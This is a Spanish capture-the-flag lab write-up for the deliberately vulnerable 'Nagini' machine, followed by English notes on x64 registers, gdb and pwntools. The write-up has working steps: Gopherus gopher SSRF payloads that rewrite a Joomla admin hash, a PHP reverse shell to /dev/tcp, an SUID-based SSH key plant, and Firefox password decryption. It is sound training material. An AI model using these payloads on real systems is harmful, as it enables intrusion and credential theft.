└─$ nmap -sT --min-rate 5000 -v -p- -open -oG nmap/all_ports_st $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-07 20:43 EST
Initiating Ping Scan at 20:43
Scanning 10.10.0.129 [2 ports]
Completed Ping Scan at 20:43, 2.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 20:43
Completed Parallel DNS resolution of 1 host. at 20:43, 2.01s elapsed
Initiating Connect Scan at 20:43
Scanning 10.10.0.129 [65535 ports]
Discovered open port 22/tcp on 10.10.0.129
Discovered open port 80/tcp on 10.10.0.129
Completed Connect Scan at 20:44, 44.54s elapsed (65535 total ports)
Nmap scan report for 10.10.0.129
Host is up (0.00053s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 48.89 seconds
</code></pre>
<h4 id="escaneo-específico-1"><a class="header" href="#escaneo-específico-1">Escaneo específico</a></h4>
<pre><code class="language-bash">└─$ nmap -sCV -p 22,80 -open -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-07 20:45 EST
Nmap scan report for 10.10.0.129
Host is up (0.00082s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.73 seconds
</code></pre>
<h2 id="enumeración-3"><a class="header" href="#enumeración-3">Enumeración</a></h2>
<h3 id="servicios-1"><a class="header" href="#servicios-1">Servicios</a></h3>
<h4 id="http---80-1"><a class="header" href="#http---80-1">http - 80</a></h4>
<p>Después de realizar ejecutar <code>ffuf</code> se identificaron las rutas:</p>
<ul>
<li><code>/note.txt</code>.</li>
<li><code>/joomla</code>.</li>
</ul>
<p>Donde en el contenido de la ruta <code>/note.txt</code> hace referencia a que se encuentra ejecutándose un servidor web de tipo quic.</p>
<pre><code class="language-text">Hello developers!!


I will be using our new HTTP3 Server at https://quic.nagini.hogwarts for further communications.
All developers are requested to visit the server regularly for checking latest announcements.


Regards,
site_amdin
</code></pre>
<p>Y la ruta de <code>/joomla</code> expone un gestor de contenido. Al ejecutar <code>joomscan</code> se identificó un archivo de configuración respaldado.</p>
<pre><code class="language-bash">└─$ joomscan --ec -u &quot;http://10.10.0.129/joomla&quot;
    ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

... Datos truncados

[+] Checking sensitive config.php.x file
[++] Readable config file is found
 config file path : http://10.10.0.129/joomla/configuration.php.bak
</code></pre>
<p>Dada la extención se pudo visualizar su contenido.</p>
<pre><code class="language-bash">└─$ curl http://10.10.0.129/joomla/configuration.php.bak
&lt;?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.&lt;br /&gt;Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'Joomla CMS';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $debug_lang_const = '1';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'goblin';
        public $password = '';
        public $db = 'joomla';
        public $dbprefix = 'joomla_';
        public $live_site = '';
        public $secret = 'ILhwP6HTYKcN7qMh';
        public $gzip = '0';
        public $error_reporting = 'default';
        public $helpurl = 'https://help.joomla.org/proxy?keyref=Help{major}{minor}:{keyref}&amp;lang={langcode}';
        public $ftp_host = '';
        public $ftp_port = '';
        public $ftp_user = '';
        public $ftp_pass = '';
        public $ftp_root = '';
        public $ftp_enable = '0';
        public $offset = 'UTC';
        public $mailonline = '1';
        public $mailer = 'mail';
        public $mailfrom = 'site_admin@nagini.hogwarts';
        public $fromname = 'Joomla CMS';
        public $sendmail = '/usr/sbin/sendmail';
        public $smtpauth = '0';
        public $smtpuser = '';
        public $smtppass = '';
        public $smtphost = 'localhost';
        public $smtpsecure = 'none';
        public $smtpport = '25';
        public $caching = '0';
        public $cache_handler = 'file';
        public $cachetime = '15';
        public $cache_platformprefix = '0';
        public $MetaDesc = '';
        public $MetaKeys = '';
        public $MetaTitle = '1';
        public $MetaAuthor = '1';
        public $MetaVersion = '0';
        public $robots = '';
        public $sef = '1';
        public $sef_rewrite = '0';
        public $sef_suffix = '0';
        public $unicodeslugs = '0';
        public $feed_limit = '10';
        public $feed_email = 'none';
        public $log_path = '/var/www/html/joomla/administrator/logs';
        public $tmp_path = '/var/www/html/joomla/tmp';
        public $lifetime = '15';
        public $session_handler = 'database';
        public $shared_session = '0';
}
</code></pre>
<p>Posterior a la mención del servidor HTTP3 se buscó información al respecto y se encontró <a href="https://github.com/cloudflare/quiche">un cliente</a> que permite la interacción con el servidor. Al realizar la instalación y navegar por medio de este, se obtuvo la siguiente página, exponiendo una ruta en el servidor web incial.</p>
<pre><code class="language-bash">└─$ ./http3-client https://10.10.0.129
&lt;html&gt;
        &lt;head&gt;
        &lt;title&gt;Information Page&lt;/title&gt;
        &lt;/head&gt;
        &lt;body&gt;
                Greetings Developers!!

                I am having two announcements that I need to share with you:

                1. We no longer require functionality at /internalResourceFeTcher.php in our main production servers.So I will be removing the same by this week.
                2. All developers are requested not to put any configuration's backup file (.bak) in main production servers as they are readable by every one.


                Regards,
                site_admin
        &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h2 id="explotación-1"><a class="header" href="#explotación-1">Explotación</a></h2>
<h3 id="ssrf"><a class="header" href="#ssrf">SSRF</a></h3>
<p>Al identificar la vulnerabilidad y poder obtener archivos mediante payloads como <code>file:///etc/passwd</code> , descubrimiento de puertos internos abiertos, etc. se identificó la herramienta <code>gopherus</code> que permite generar payloads para establecer conexiones y poder enumerar otros tipos de servicios mediante el protocolo <code>gopher://</code> y dado que se cuenta con credenciales de la base de datos local se hizo uso de esta para buscar dentro de esta.</p>
<pre><code class="language-bash">└─$ python gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: show databases;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
</code></pre>
<p>Sin embargo, a pesar de contar con el payload adecuado, se tuvo que mandar múltiples veces ya que no siempre fue interpretado.</p>
<p><img src="guides/ecpptv2_lab/2_nagini/images/exploit_1.png" alt="Lista de bases de datos" /></p>
<p>Posteriormente se extrajo el hash del usuario administrador de joomla, mediante:</p>
<pre><code class="language-bash">└─$ python gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: use joomla;select username,password from joomla_users;

Your gopher link is ready to do SSRF :

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%37%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%73%65%6c%65%63%74%20%75%73%65%72%6e%61%6d%65%2c%70%61%73%73%77%6f%72%64%20%66%72%6f%6d%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
</code></pre>
<p><img src="guides/ecpptv2_lab/2_nagini/images/exploit_2.png" alt="Hash de usuario de joomla" /></p>
<p>Para posteriormente crackearlo haciéndo uso de <code>jhon</code>, sin embargo, no fue satisfactorio el proceso por lo que se intentó modificar el hash del usuario identificado en la base de datos, generando un hash previamente.</p>
<pre><code class="language-bash">└─$ echo -n 'srrequiem' | md5sum
7482dd7f2bbb7f277796bcdfb52e717e  -
</code></pre>
<p>Para después sustituir su valor por el hash actual, mediante la consulta.</p>
<pre><code class="language-bash">└─$ python gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  &gt;__|  |____//____  &gt;
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: use joomla;update joomla_users set password = '7482dd7f2bbb7f277796bcdfb52e717e' where username = 'site_admin';

Your gopher link is ready to do SSRF :

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%70%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%75%70%64%61%74%65%20%6a%6f%6f%6d%6c%61%5f%75%73%65%72%73%20%73%65%74%20%70%61%73%73%77%6f%72%64%20%3d%20%27%37%34%38%32%64%64%37%66%32%62%62%62%37%66%32%37%37%37%39%36%62%63%64%66%62%35%32%65%37%31%37%65%27%20%77%68%65%72%65%20%75%73%65%72%6e%61%6d%65%20%3d%20%27%73%69%74%65%5f%61%64%6d%69%6e%27%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
</code></pre>
<p>Logrando así acceder al panel de joomla.</p>
<p><img src="guides/ecpptv2_lab/2_nagini/images/exploit_3.png" alt="Panel de joomla" /></p>
<p>Para ganar acceso a la máquina se modificó la página de error del template usado seleccionando en el panel superior del sitio <code>Extensions &gt; Templates &gt; Templates &gt; Seleccionar template en uso</code> y dentro del modo de &quot;edición&quot; se seleccionó y modificó el archivo <code>error.php</code> poniendo una instrucción de ejecución de comandos como:</p>
<pre><code class="language-php">system('bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.0.128/1234 0&gt;&amp;1&quot;');
</code></pre>
<p>Guardando el archivo y disparándolo con un error HTTP 404, por ejemplo, navegando a <code>http://10.10.0.129/joomla/index.php/rutainexistente</code>.</p>
<p><img src="guides/ecpptv2_lab/2_nagini/images/exploit_4.png" alt="Reverse shell en error.php" /></p>
<p><em>Dado que el presente write-up se trabajó en el laboratorio señalado, la conexión de la reverse shell se mandó al nodo más cercano (Aragog), en el cual, mediante <code>socat TCP-LISTEN:1234,fork TCP:192.168.111.162:1234</code> se redirigió el tráfico de red a la máquina atacante.</em></p>
<p>Obteniendo así acceso a la máquina y el primer horrocrux.</p>
<pre><code class="language-bash">└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.111.162] from (UNKNOWN) [192.168.111.175] 49402
bash: cannot set terminal process group (854): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Nagini:/var/www/html/joomla$ cd ..
www-data@Nagini:/var/www/html$ ls -la
total 356
drwxr-xr-x  3 root     root       4096 Apr  4  2021 .
drwxr-xr-x  3 root     root       4096 Apr  3  2021 ..
-rw-r--r--  1 root     root     323790 Apr  2  2021 harry_potter_2.jpg
-rw-r--r--  1 ron      ron          63 Apr  4  2021 horcrux1.txt
-rw-r--r--  1 root     root         61 Apr  4  2021 .htaccess
-rw-r--r--  1 root     root         97 Apr  2  2021 index.html
-rw-r--r--  1 root     root        612 Apr  2  2021 index.nginx-debian.html
-rw-r--r--  1 root     root        854 Apr  4  2021 internalResourceFeTcher.php
drwxr-xr-x 17 www-data www-data   4096 Apr  3  2021 joomla
-rw-r--r--  1 root     root        234 Apr  3  2021 note.txt
www-data@Nagini:/var/www/html$ cat horcrux1.txt
horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}
</code></pre>
<h2 id="post-explotación-2"><a class="header" href="#post-explotación-2">Post Explotación</a></h2>
<h3 id="escalación-de-privilegios-1"><a class="header" href="#escalación-de-privilegios-1">Escalación de privilegios</a></h3>
<h4 id="www-data--snape"><a class="header" href="#www-data--snape">www-data → snape</a></h4>
<p>Dentro del directorio <code>/home/snape</code> se encontró el archivo <code>.creds.txt</code> al cual se tenía lectura, desencodeando el contenido en base64 se obtuvo una shell como el usuario <code>snape</code>.</p>
<pre><code class="language-bash">www-data@Nagini:/home/snape$ ls -la
ls -la
total 32
drwxr-xr-x 4 snape snape 4096 Apr  4  2021 .
drwxr-xr-x 4 root  root  4096 Apr  4  2021 ..
-rw-r--r-- 1 snape snape  220 Apr  3  2021 .bash_logout
-rw-r--r-- 1 snape snape 3526 Apr  3  2021 .bashrc
-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
drwx------ 3 snape snape 4096 Apr  4  2021 .gnupg
-rw-r--r-- 1 snape snape  807 Apr  3  2021 .profile
drwx------ 2 snape snape 4096 Apr  4  2021 .ssh
www-data@Nagini:/home/snape$ cat .creds.txt
cat .creds.txt
TG92ZUBsaWxseQ==
www-data@Nagini:/home/snape$ cat .creds.txt | base64 -d &amp;&amp; echo
cat .creds.txt | base64 -d &amp;&amp; echo
Love@lilly
</code></pre>
<h4 id="www-data--hermoine"><a class="header" href="#www-data--hermoine">www-data → hermoine</a></h4>
<p>Dentro del directorio <code>/home/hermoine</code> se encontró una copia del binario <code>cp</code> con permisos de SUID, al contar con este permiso y dado que el servicio <code>ssh</code> se encuentra disponible se podría generar una llave ssh para este usuario y pegar la pública dentro de <code>/home/hermione/.ssh/authorized_keys</code>.</p>
<pre><code class="language-bash"># Kali
└─$ ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/srrequiem/.ssh/id_rsa): ./hermione_id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./hermione_id_rsa
Your public key has been saved in ./hermione_id_rsa.pub
The key fingerprint is:
SHA256:guTPHqxLBjUO/euSXDbm4CHuMHT8RwFJlcLXirZBEIo srrequiem@pwnchadnezzar
The key's randomart image is:
+---[RSA 3072]----+
|   o=oo.o        |
|. .. =.o .       |
|E.. * +..        |
|  .* B ..        |
| ..o= =.S        |
|. o.+=*o         |
|o. +oX*o         |
| o.o=+o.         |
| .. ooo          |
+----[SHA256]-----+

# Copiar contenido de ./hermione_id_rsa.pub

# Nagini
snape@Nagini:/home/hermoine$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFu+CNPc/WM1fvrT1gIfuTYmpIq6RRqTHZTP+3H22OiSHgyN2LmhQqw0EO9y6CBecm9p3vEUrI98ErzSSsZbihn7IeGlK6yaomLmiEYJphq3bzjXkqZb6nWYATqSeV3WkC6Br3bNJsZWg8AVbqlCGRL2VGca6Mw30rB6tej68Qr+1XOmDEKhjMeCD/CHqXi1r29mUBoPAT8YxhGyY9vLFgf5fLNzZRZfKWfmusiPSnxrzyKTPpuj0rmwkAOf/gC6BHKC13PwON+ykxFP1+6PiSC2TF8K87mT2KHFHwB7wQurjaVez30fAaodU5toIYj/XWhWYxZmith/fvus7H2JUqJZeULeT5fPKf1SKJXgBsM6oyHq1lr/2isNvoIb7eCAoQTdJObBCpahWhhalKC+VbxES+dVgSZ0k0v4I0zENB/snqYUAzqKprwykVKRz12Oj/hYbRk2rUj9nwcTl/Ol9WLhwaQlir5RJiTEws8a8+g5qKXTXEqel+X2WIyoQS9tc=' &gt; /tmp/hermione.pub
snape@Nagini:/home/hermoine$ bin/su_cp /tmp/hermione.pub .ssh/authorized_keys

# Kali
└─$ ssh hermoine@10.10.0.129 -i hermione_id_rsa
Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr  4 16:43:01 2021 from ::1
hermoine@Nagini:~$
</code></pre>
<p>De esta manera se podría extraer el segundo horrocrux.</p>
<pre><code class="language-bash">hermoine@Nagini:~$ ls -la
total 28
drwxr-xr-x 6 hermoine hermoine 4096 Apr  4  2021 .
drwxr-xr-x 4 root     root     4096 Apr  4  2021 ..
drwxr-xr-x 2 hermoine hermoine 4096 Apr  4  2021 bin
drwx------ 3 hermoine hermoine 4096 Apr  4  2021 .gnupg
-r--r----- 1 hermoine hermoine   75 Apr  4  2021 horcrux2.txt
drwx------ 5 hermoine hermoine 4096 Jun  1  2019 .mozilla
drwxr-xr-x 2 hermoine hermoine 4096 Mar  9 02:53 .ssh
hermoine@Nagini:~$ cat horcrux2.txt
horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}
</code></pre>
<h4 id="hermoine--root"><a class="header" href="#hermoine--root">hermoine → root</a></h4>
<p>Dentro del usuario en turno, se identificaron archivos de mozilla firefox, los cuales al indagar al respecto se encontró el repositorio de <a href="https://github.com/lclevy/firepwd">firepwd</a> que con los archivos dentro de <code>.mozilla</code> (key3.db o jey4.db y logins.json) permite descifrar las contraseñas protegidas de firefox.</p>
<p>Al copiar el <code>/home/hermoine/.mozilla/firefox/g2mhbq0o.default/key4.db</code> y <code>/home/hermoine/.mozilla/firefox/g2mhbq0o.default/logins.json</code> en la máquina local para la ejecución del script <code>firepwd.py</code>, se extrajo la contraseña de root de la siguiente manera:</p>
<pre><code class="language-bash">└─$ python firepwd.py -d /home/srrequiem/Documents/ecpptv2_lab/2_nagini/content/
globalSalt: b'db8e223cef34f55b9458f52286120b8fb5293c95'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'2065c62fe9dc4d8352677299cc0f2cb8'
 }
entrySalt: b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'ceedd70a1cfd8295250bcfed5ff49b6c878276b968230619a2c6c51aa4ea5c8e'
 }
entrySalt: b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
b'233bb64646075d9dfe8c464f94f4df235234d94f4c2334940808080808080808'
decrypting login/password pairs
http://nagini.hogwarts:b'root',b'@Alohomora#123'
</code></pre>
<p>Teniendo así acceso a <code>root</code> y al tercer horrocrux.</p>
<pre><code class="language-bash">hermoine@Nagini:~/.mozilla$ su -
Password:
root@Nagini:~# ls -la
total 68
drwx------  5 root root   4096 Feb  6 02:14 .
drwxr-xr-x 18 root root   4096 Apr  4  2021 ..
-rw-------  1 root root     44 Apr  4  2021 .bash_history
-rw-r--r--  1 root root    570 Apr  3  2021 .bashrc
drwx------  3 root root   4096 Mar 31  2021 .gnupg
-rw-r--r--  1 root snape   810 Apr  4  2021 horcrux3.txt
drwxr-xr-x  3 root root   4096 Feb  6 02:14 .local
-rw-------  1 root root    298 Apr  4  2021 .mysql_history
-rw-r--r--  1 root root    148 Apr  3  2021 .profile
-rw-r--r--  1 root root     74 Mar 31  2021 .selected_editor
drwx------  2 root root   4096 Mar 31  2021 .ssh
-rw-------  1 root root  13566 Apr  4  2021 .viminfo
-rw-r--r--  1 root root    213 Apr  3  2021 .wget-hsts
-rw-------  1 root root     52 Apr  4  2021 .Xauthority
root@Nagini:~# cat horcrux3.txt
  ____                            _         _       _   _
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Medium
Machine Name: Nagini
Horcruxes Hidden in this VM: 3 horcruxes

You have successfully pwned Nagini machine.
Here is your third hocrux: horcrux_{NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=}




# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com
</code></pre>
<h2 id="notas-adicionales"><a class="header" href="#notas-adicionales">Notas adicionales</a></h2>
<p>Dentro de la búsqueda para la extracción de las contraseñas de mozilla firefox, se encontró el script <a href="https://fossies.org/linux/hashcat/tools/mozilla2hashcat.py">mozilla2hashcat.py</a> que permite extraer el hash del archivo protegido <code>key3.db</code> o <code>key4.db</code>.</p>
<h2 id="referencias-4"><a class="header" href="#referencias-4">Referencias</a></h2>
<ul>
<li><a href="https://github.com/cloudflare/quiche">quiche - HTTP3 client</a>.</li>
<li><a href="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery#gopher">Hacktricks - SSRF gopher</a>.</li>
<li><a href="https://github.com/tarunkant/Gopherus">Github - gopherus</a>.</li>
<li><a href="https://github.com/lclevy/firepwd">Firepwd.py, an open source tool to decrypt Mozilla protected passwords</a></li>
<li><a href="https://fossies.org/linux/hashcat/tools/mozilla2hashcat.py">mozilla2hashcat.py</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="fawkes"><a class="header" href="#fawkes">Fawkes</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="notas-de-nightmare"><a class="header" href="#notas-de-nightmare">Notas de Nightmare</a></h1>
<p><a href="https://guyinatuxedo.github.io/">https://guyinatuxedo.github.io/</a></p>
<h2 id="1-introduction"><a class="header" href="#1-introduction">1 Introduction</a></h2>
<h3 id="11-assembly"><a class="header" href="#11-assembly">1.1 Assembly</a></h3>
<h4 id="registers-1"><a class="header" href="#registers-1">Registers</a></h4>
<ul>
<li>rbp: Base Pointer, points to the bottom of the current stack frame</li>
<li>rsp: Stack Pointer, points to the top of the current stack frame</li>
<li>rip: Instruction Pointer, points to the instruction to be executed</li>
</ul>
<p><strong>General Purpose Registers</strong>
These can be used for a variety of different things</p>
<ul>
<li>rax</li>
<li>rbx</li>
<li>rcx</li>
<li>rdx</li>
<li>rsi</li>
<li>rdi</li>
<li>r8</li>
<li>r9</li>
<li>r10</li>
<li>r11</li>
<li>r12</li>
<li>r13</li>
<li>r14</li>
<li>r15</li>
</ul>
<p>In <code>x64</code> linux arguments to a function are passed via registers. The first few args are passed by these registers:</p>
<ul>
<li>rdi:    First Argument</li>
<li>rsi:    Second Argument</li>
<li>rdx:    Third Argument</li>
<li>rcx:    Fourth Argument</li>
<li>r8:     Fifth Argument</li>
<li>r9:     Sixth Argument</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>8 Byte Register</th><th>Lower 4 Bytes</th><th>Lower 2 Bytes</th><th>Lower Byte</th></tr></thead><tbody>
<tr><td>rbp</td><td>ebp</td><td>bp</td><td>bpl</td></tr>
<tr><td>rsp</td><td>esp</td><td>sp</td><td>spl</td></tr>
<tr><td>rip</td><td>eip</td><td></td><td></td></tr>
<tr><td>rax</td><td>eax</td><td>ax</td><td>al</td></tr>
<tr><td>rbx</td><td>ebx</td><td>bx</td><td>bl</td></tr>
<tr><td>rcx</td><td>ecx</td><td>cx</td><td>cl</td></tr>
<tr><td>rdx</td><td>edx</td><td>dx</td><td>dl</td></tr>
<tr><td>rsi</td><td>esi</td><td>si</td><td>sil</td></tr>
<tr><td>rdi</td><td>edi</td><td>di</td><td>dil</td></tr>
<tr><td>r8</td><td>r8d</td><td>r8w</td><td>r8b</td></tr>
<tr><td>r9</td><td>r9d</td><td>r9w</td><td>r9b</td></tr>
<tr><td>r10</td><td>r10d</td><td>r10w</td><td>r10b</td></tr>
<tr><td>r11</td><td>r11d</td><td>r11w</td><td>r11b</td></tr>
<tr><td>r12</td><td>r12d</td><td>r12w</td><td>r12b</td></tr>
<tr><td>r13</td><td>r13d</td><td>r13w</td><td>r13b</td></tr>
<tr><td>r14</td><td>r14d</td><td>r14w</td><td>r14b</td></tr>
<tr><td>r15</td><td>r15d</td><td>r15w</td><td>r15b</td></tr>
</tbody></table>
</div>
<p>In <code>x64</code> we will see the <code>8</code> byte registers. However in <code>x86</code> the largest sized registers we can use are the <code>4</code> byte registers like <code>ebp</code>, <code>esp</code>, <code>eip</code> etc. Now we can also use smaller registers, than the maximum sized registers for the architecture.</p>
<p>In <code>x64</code> there is the <code>rax</code>, <code>eax</code>, <code>ax</code>, and <code>al</code> register. The <code>rax</code> register points to the full <code>8</code>. The <code>eax</code> register is just the lower four bytes of the <code>rax</code> register. The <code>ax</code> register is the last <code>2</code> bytes of the <code>rax</code> register. Lastly the <code>al</code> register is the last byte of the <code>rax</code> register.</p>
<h3 id="14-debugginng-with-dbg"><a class="header" href="#14-debugginng-with-dbg">1.4 Debugginng with DBG</a></h3>
<ul>
<li><code>nexti</code> - will have you go instruction by intruction through the program, but will not step into function calls such as puts.</li>
<li><code>next</code> - which will take you through one line of code, but will step over function calls such as puts.</li>
<li><code>step</code> - which will take you through one line of code, but will step into function calls</li>
<li><code>stepi</code> - whch will take you through one instruction at a time, stepping into function calls.</li>
<li><code>x</code> - examine things.</li>
<li><code>x/a</code> - as an address.</li>
<li><code>x/10c</code> - as a number of characters.</li>
<li><code>x/s</code> - as a string.</li>
<li><code>x/g</code> - as a qword.</li>
<li><code>x/w</code> - as a dword.</li>
</ul>
<h3 id="15-scripting-with-python-pwntools"><a class="header" href="#15-scripting-with-python-pwntools">1.5 Scripting with Python pwntools</a></h3>
<ul>
<li><code>p64(x)</code> - pack the integer as a least endian QWORD.</li>
<li><code>p32(x)</code> - pack the integer as a least endian DWORD.</li>
<li><code>u64(x)</code> - unpack a least endian QWORD and get it's integer value.</li>
<li><code>u32(x)</code> - unpack a least endian DWORD and get it's integer value.</li>
</ul>
<h2 id="cheatsheet"><a class="header" href="#cheatsheet">Cheatsheet</a></h2>
<p>Visualizar ensamblador paginado:</p>
<pre><code class="language-bash">objdump -D &lt;binary&gt; -M intel | less
</code></pre>
